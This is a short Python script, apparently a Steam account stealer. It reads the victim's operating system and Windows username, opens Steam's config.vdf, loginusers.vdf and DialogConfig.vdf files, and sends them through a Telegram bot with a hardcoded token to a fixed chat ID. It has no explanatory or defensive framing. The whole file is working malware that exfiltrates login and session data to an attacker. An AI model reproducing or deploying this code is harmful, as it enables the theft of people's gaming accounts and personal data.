import os 
import telebot
import platform

system = platform.system()


token = "7691279634:AAEdQQnbmbJg4pk7NUQUsk9C-bIjtxFMUGc"

bot = telebot.TeleBot(token)
i=0

username = os.getlogin()

doc1 = open("C:/Program Files/Steam/config/config.vdf", 'rb') 
doc2 = open("C:/Program Files/Steam/config/loginusers.vdf", 'rb')
doc3 = open("C:/Program Files/Steam/config/DialogConfig.vdf", 'rb')

bot.send_message(6194073608, "Устройство: " + system )

bot.send_message(6194073608, "Пользователь: " + username ) 

bot.send_document(6194073608, doc1) 
bot.send_document(6194073608, doc2)
bot.send_document(6194073608, doc3)


